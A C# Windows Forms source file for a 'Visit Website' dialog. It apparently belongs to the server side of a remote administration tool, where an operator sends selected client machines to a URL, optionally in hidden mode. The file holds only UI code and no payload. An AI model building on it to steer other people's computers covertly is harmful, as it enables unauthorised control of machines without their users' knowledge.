using System;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmVisitWebsite : Form
    {
        private readonly int _selectedClients;

        public FrmVisitWebsite(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void FrmVisitWebsite_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Visit Website", _selectedClients);
            txtURL.Text = VisitWebsite.URL;
            chkVisitHidden.Checked = VisitWebsite.Hidden;
        }

        private void btnVisitWebsite_Click(object sender, EventArgs e)
        {
            VisitWebsite.URL = txtURL.Text;
            VisitWebsite.Hidden = chkVisitHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}